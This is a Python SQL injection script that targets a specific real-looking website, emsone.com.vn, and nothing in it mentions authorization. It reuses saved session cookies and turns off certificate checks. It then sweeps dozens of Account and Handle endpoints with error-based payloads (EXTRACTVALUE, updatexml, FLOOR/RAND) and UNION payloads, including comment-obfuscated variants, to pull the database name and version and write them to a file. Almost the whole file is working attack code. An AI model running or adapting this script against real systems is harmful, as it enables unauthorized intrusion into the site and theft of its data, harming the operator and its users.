#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import time
import re
import urllib3
urllib3.disable_warnings()

class DeepSQLi:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.db_info = {}
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def test_all_account_endpoints(self):
        """测试所有Account端点"""
        print("[*] 测试所有Account端点...")
        
        endpoints = [
            '/Account/GetUserInfo',
            '/Account/GetUserInfoById',
            '/Account/GetUserById',
            '/Account/GetById',
            '/Account/UserInfo',
            '/Account/Info',
            '/Account/Details',
            '/Account/Profile',
            '/Account/GetProfile',
            '/Account/View',
            '/Account/GetDetails',
            '/Account/GetUser',
            '/Account/Get',
            '/Account/List',
            '/Account/Search',
            '/Account/Query',
            '/Account/Find',
            '/Account/Load',
            '/Account/Fetch',
            '/Account/Retrieve',
            '/Account/Index',
            '/Account/Show',
            '/Account/Display',
        ]
        
        payload = "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST123'), 0x7e))--"
        
        working = []
        for endpoint in endpoints:
            url = f"{self.base_url}{endpoint}?id={urllib.parse.quote(payload)}"
            try:
                r = self.session.get(url, timeout=10)
                if 'TEST123' in r.text or ('XPATH' in r.text.upper() and 'TEST123' in r.text):
                    print(f"    [!] 有效: {endpoint}")
                    working.append(endpoint)
            except:
                pass
        
        return working
    
    def test_post_sqli(self):
        """测试POST SQL注入"""
        print("[*] 测试POST SQL注入...")
        
        endpoints = [
            '/Account/JLogin',
            '/Account/Register',
            '/Account/ChangePassword',
            '/Account/UpdateProfile',
            '/Handle/SearchListCustomer',
        ]
        
        payload = "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--"
        
        for endpoint in endpoints:
            # 测试不同参数
            test_data = {
                'id': payload,
                'MobileNumber': payload,
                'Email': payload,
                'q': payload,
                'search': payload,
            }
            
            try:
                r = self.session.post(f"{self.base_url}{endpoint}", data=test_data, timeout=10)
                if 'TEST' in r.text or 'XPATH' in r.text.upper():
                    print(f"    [!] POST有效: {endpoint}")
                    match = re.search(r"XPATH syntax error: '~([^']+)~'", r.text, re.IGNORECASE)
                    if match:
                        print(f"        提取: {match.group(1)}")
                    return endpoint, test_data
            except:
                pass
        
        return None, None
    
    def test_json_sqli(self):
        """测试JSON SQL注入"""
        print("[*] 测试JSON SQL注入...")
        
        endpoints = [
            '/Account/JLogin',
            '/Handle/SearchListCustomer',
            '/api/users',
        ]
        
        payload = "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--"
        
        for endpoint in endpoints:
            test_data = {
                'id': payload,
                'MobileNumber': payload,
                'q': payload,
            }
            
            try:
                r = self.session.post(f"{self.base_url}{endpoint}", json=test_data, timeout=10)
                if 'TEST' in r.text or 'XPATH' in r.text.upper():
                    print(f"    [!] JSON有效: {endpoint}")
                    return endpoint
            except:
                pass
        
        return None
    
    def extract_with_working_endpoint(self, endpoint, method='GET', param='id', query='SELECT database()'):
        """使用有效端点提取"""
        print(f"\n[*] 使用端点提取: {endpoint}")
        
        payload = f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, ({query}), 0x7e))--"
        
        if method == 'GET':
            url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
            r = self.session.get(url, timeout=10)
        else:
            data = {param: payload}
            r = self.session.post(f"{self.base_url}{endpoint}", data=data, timeout=10)
        
        # 提取值
        match = re.search(r"XPATH syntax error: '~([^']+)~'", r.text, re.IGNORECASE)
        if match:
            value = match.group(1)
            print(f"    [+] 提取值: {value}")
            return value
        
        # 检查响应
        if 'XPATH' in r.text.upper():
            print(f"    响应: {r.text[:500]}")
        
        return None
    
    def test_error_variations(self):
        """测试报错注入变体"""
        print("[*] 测试报错注入变体...")
        
        endpoint = '/Account/GetUserInfo'
        query = "SELECT database()"
        
        payloads = [
            f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, ({query}), 0x7e))--",
            f"1' AND updatexml(1, CONCAT(0x7e, ({query}), 0x7e), 1)--",
            f"1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(({query}),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, ({query}), 0x7e))/**/--",
            f"1'/**/AND/**/EXTRACTVALUE(1, CONCAT(0x7e, ({query}), 0x7e))--",
        ]
        
        for payload in payloads:
            url = f"{self.base_url}{endpoint}?id={urllib.parse.quote(payload)}"
            try:
                r = self.session.get(url, timeout=10)
                
                # 检查所有可能的提取位置
                if 'XPATH' in r.text.upper():
                    # 保存响应
                    with open(f'sqli_response_{hash(payload)}.html', 'w', encoding='utf-8') as f:
                        f.write(r.text)
                    
                    # 尝试所有提取模式
                    patterns = [
                        r"XPATH syntax error: '~([^']+)~'",
                        r"'~([^']+)~'",
                        r"~([^~]+)~",
                        r"XPATH syntax error: ([^']+)",
                    ]
                    
                    for pattern in patterns:
                        match = re.search(pattern, r.text, re.IGNORECASE)
                        if match:
                            value = match.group(1)
                            if value and len(value) > 0:
                                print(f"    [!] Payload有效: {payload[:50]}...")
                                print(f"        提取值: {value}")
                                return value
            except:
                pass
        
        return None
    
    def test_other_handle_endpoints(self):
        """测试其他Handle端点"""
        print("[*] 测试其他Handle端点...")
        
        endpoints = [
            '/Handle/SearchListCustomer',
            '/Handle/SearchListWardByDistrictID',
            '/Handle/SearchListDistrictByProvinceID',
            '/Handle/SearchListWareHouse',
            '/Handle/SearchListProductVariantByWareHouseID',
            '/Handle/SearchListFunctionalByGroupPermissionID',
        ]
        
        payload = "1' UNION SELECT 'SQLTEST123'--"
        
        for endpoint in endpoints:
            # 测试不同参数
            params = ['id', 'ID', 'q', 'Type', 'DistrictID', 'ProvinceID', 'WareHouseID', 'GroupPermissionID']
            
            for param in params:
                url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
                try:
                    r = self.session.get(url, timeout=10)
                    if 'SQLTEST123' in r.text:
                        print(f"    [!] Union注入有效: {endpoint} [{param}]")
                        return endpoint, param
                except:
                    pass
        
        return None, None
    
    def extract_with_union(self, endpoint, param, query, label):
        """使用Union提取"""
        print(f"\n[*] Union提取: {label}")
        
        payload = f"1' UNION SELECT {query}--"
        url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
        
        try:
            r = self.session.get(url, timeout=10)
            if r.status_code == 200:
                try:
                    data = json.loads(r.text)
                    # 查找数据
                    for item in data:
                        for k, v in item.items():
                            if v and isinstance(v, str):
                                if any(keyword in v.lower() for keyword in ['mysql', 'microsoft', 'sql server', '@', '.']):
                                    print(f"    [+] {label}: {v}")
                                    return v
                                # 版本号格式
                                if re.match(r'\d+\.\d+', v):
                                    print(f"    [+] {label}: {v}")
                                    return v
                except:
                    # 文本提取
                    if query.split()[1].lower() in r.text.lower():
                        print(f"    响应: {r.text[:300]}")
        except:
            pass
        
        return None
    
    def run_all(self):
        """执行所有测试"""
        print("="*60)
        print("深度SQL注入挖掘")
        print("="*60)
        
        # 1. 测试所有Account端点
        working_endpoints = self.test_all_account_endpoints()
        
        # 2. 测试POST注入
        post_endpoint, post_data = self.test_post_sqli()
        
        # 3. 测试JSON注入
        json_endpoint = self.test_json_sqli()
        
        # 4. 测试报错注入变体
        db_name = self.test_error_variations()
        if db_name:
            self.db_info['database'] = db_name
        
        # 5. 测试其他Handle端点
        union_endpoint, union_param = self.test_other_handle_endpoints()
        
        # 6. 如果找到Union注入点，提取数据
        if union_endpoint:
            version = self.extract_with_union(union_endpoint, union_param, "version()", "版本")
            if version:
                self.db_info['version'] = version
            
            db_name = self.extract_with_union(union_endpoint, union_param, "database()", "数据库名")
            if db_name:
                self.db_info['database'] = db_name
        
        # 保存结果
        with open('deep_sqli_results.json', 'w', encoding='utf-8') as f:
            json.dump(self.db_info, f, indent=2, ensure_ascii=False)
        
        print("\n" + "="*60)
        print("提取结果")
        print("="*60)
        for k, v in self.db_info.items():
            print(f"{k}: {v}")

if __name__ == "__main__":
    sqli = DeepSQLi()
    sqli.run_all()